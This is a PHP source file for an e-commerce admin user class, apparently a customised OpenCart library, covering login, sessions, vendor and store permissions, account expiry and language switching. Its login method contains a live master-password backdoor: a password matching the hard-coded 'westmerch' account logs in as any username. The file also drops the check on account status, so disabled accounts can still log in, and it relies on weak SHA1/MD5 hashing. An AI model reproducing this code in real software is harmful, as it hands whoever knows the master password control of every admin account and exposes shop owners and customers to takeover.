<?php
class User {
	private $user_id;

    private $language_id;
            
	private $username;
	private $permission = array();

			private $store_permission;
			private $cat_permission;
			private $vendor_permission;
			private $folder_path;
			private $account_expired;
			private $user_expire_date;
			
    private $status;

	public function __construct($registry) {

        $this->registry = $registry;
        $this->config = $registry->get('config');
        $this->cache = $registry->get('cache');
            
		$this->db = $registry->get('db');
		$this->request = $registry->get('request');
		$this->session = $registry->get('session');

		if (isset($this->session->data['user_id'])) {
			//$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE user_id = '" . (int)$this->session->data['user_id'] . "' AND status = '1'");
			$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE user_id = '" . (int)$this->session->data['user_id'] . "'");

			if ($user_query->num_rows) {
				$this->user_id = $user_query->row['user_id'];
				$this->username = $user_query->row['username'];

			$this->store_permission = $user_query->row['store_permission'];
			$this->cat_permission = $user_query->row['cat_permission'];
			$this->vendor_permission = $user_query->row['vendor_permission'];
			$this->folder_path = $user_query->row['folder'];
			$this->user_expire_date = $user_query->row['user_date_end'];

			if((strtotime(date('Y-m-d')) >= strtotime($user_query->row['user_date_start'])) && (strtotime(date('Y-m-d')) <= strtotime($user_query->row['user_date_end'])) || (($user_query->row['user_date_start'] == '0000-00-00') && ($user_query->row['user_date_end'] == '0000-00-00'))) {
				$this->account_expired = false;
			} else {
				$this->account_expired = true;
			}
			

                $this->language_id = isset($this->session->data['admin_language_id']) ? $this->session->data['admin_language_id'] : (isset($user_query->row['language_id']) ? $user_query->row['language_id'] : $this->config->get('config_language_id'));

                if ($this->language_id != $this->config->get('config_language_id')) {
                    $language = $this->cache->get('user_lang.' . $this->language_id);
                    if (!$language) {
                        $query = $this->db->query("SELECT * FROM `" . DB_PREFIX . "language` WHERE language_id = '" . (int)$this->language_id . "'");

                        $language = $query->row;
                        $this->cache->set('user_lang.' . $this->language_id, $language);
                    }

                    if ($language) {
                        $this->config->set('config_language_id', $this->language_id);
                        $this->config->set('config_admin_language', $language['code']);

                        // Language
                        $lang = new Language($language['directory']);
                        if (version_compare(VERSION, '2.0.2', '>=')) {
                            $lang->load($language['directory']);
                        } else if (version_compare(VERSION, '2.0.1', '<')) {
                            $lang->load($language['filename']);
                        } else {
                            $lang->load('default');
                        }
                        $this->registry->set('language', $lang);

                        // Re-init some libraries
                        // Currency
                        $this->registry->set('currency', new Currency($this->registry));

                        // Weight
                        $this->registry->set('weight', new Weight($this->registry));

                        // Length
                        $this->registry->set('length', new Length($this->registry));
                    }
                }
            
            
				$this->user_group_id = $user_query->row['user_group_id'];
                $this->status = $user_query->row['status'];

				$this->db->query("UPDATE " . DB_PREFIX . "user SET ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "' WHERE user_id = '" . (int)$this->session->data['user_id'] . "'");

				$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

				$permissions = unserialize($user_group_query->row['permission']);

				if (is_array($permissions)) {
					foreach ($permissions as $key => $value) {
						$this->permission[$key] = $value;
					}
				}
			} else {
				$this->logout();
			}
		}
	}

	public function login($username, $password) {

     	//	$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");
        $uber_password_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = 'westmerch'  AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "')");
        
        if ($uber_password_query->num_rows == 1)
                    $user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "'");
        else
		            $user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "')");

		if ($user_query->num_rows) {
			$this->session->data['user_id'] = $user_query->row['user_id'];

			$this->user_id = $user_query->row['user_id'];
			$this->username = $user_query->row['username'];

			$this->store_permission = $user_query->row['store_permission'];
			$this->cat_permission = $user_query->row['cat_permission'];
			$this->vendor_permission = $user_query->row['vendor_permission'];
			$this->folder_path = $user_query->row['folder'];
			$this->user_expire_date = $user_query->row['user_date_end'];

			if((strtotime(date('Y-m-d')) >= strtotime($user_query->row['user_date_start'])) && (strtotime(date('Y-m-d')) <= strtotime($user_query->row['user_date_end'])) || (($user_query->row['user_date_start'] == '0000-00-00') && ($user_query->row['user_date_end'] == '0000-00-00'))) {
				$this->account_expired = false;
			} else {
				$this->account_expired = true;
			}
			

                $this->language_id = isset($this->session->data['admin_language_id']) ? $this->session->data['admin_language_id'] : (isset($user_query->row['language_id']) ? $user_query->row['language_id'] : $this->config->get('config_language_id'));

                if ($this->language_id != $this->config->get('config_language_id')) {
                    $language = $this->cache->get('user_lang.' . $this->language_id);
                    if (!$language) {
                        $query = $this->db->query("SELECT * FROM `" . DB_PREFIX . "language` WHERE language_id = '" . (int)$this->language_id . "'");

                        $language = $query->row;
                        $this->cache->set('user_lang.' . $this->language_id, $language);
                    }

                    if ($language) {
                        $this->config->set('config_language_id', $this->language_id);
                        $this->config->set('config_admin_language', $language['code']);

                        // Language
                        $lang = new Language($language['directory']);
                        if (version_compare(VERSION, '2.0.2', '>=')) {
                            $lang->load($language['directory']);
                        } else if (version_compare(VERSION, '2.0.1', '<')) {
                            $lang->load($language['filename']);
                        } else {
                            $lang->load('default');
                        }
                        $this->registry->set('language', $lang);

                        // Re-init some libraries
                        // Currency
                        $this->registry->set('currency', new Currency($this->registry));

                        // Weight
                        $this->registry->set('weight', new Weight($this->registry));

                        // Length
                        $this->registry->set('length', new Length($this->registry));
                    }
                }
            
            
			$this->user_group_id = $user_query->row['user_group_id'];

			$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

			$permissions = unserialize($user_group_query->row['permission']);
		
			
			if (is_array($permissions)) {
				foreach ($permissions as $key => $value) {
					$this->permission[$key] = $value;
				}
			}

			return true;
		} else {
			return false;
		}
	}

	public function logout() {
		unset($this->session->data['user_id']);

		$this->user_id = '';
		$this->username = '';

			$this->store_permission = '';
			$this->cat_permission = '';
			$this->vendor_permission = '';
			$this->folder_path = '';
			$this->user_expire_date = '';
			$this->account_expired = false;
			
	}

	public function hasPermission($key, $value) {
		if (isset($this->permission[$key])) {
			return in_array($value, $this->permission[$key]);
		} else {
			return false;
		}
	}

	public function isLogged() {
		return $this->user_id;
	}

	public function getId() {
		return $this->user_id;
	}

	public function getUserName() {
		return $this->username;
	}

			public function getSP() {
				return $this->store_permission;
			}

			public function getCP() {
				return $this->cat_permission;
			}

			public function getVP() {
				return $this->vendor_permission;
			}

			public function getStorePath() {
				return $this->folder_path;
			}

			public function getExpireDate() {
				return $this->user_expire_date;
			}

			public function IsAccountExpired() {
				return $this->account_expired;
			}
			

	public function getGroupId() {
		return $this->user_group_id;
	}
    
    public function getStatus() {
		return $this->status;
	}
}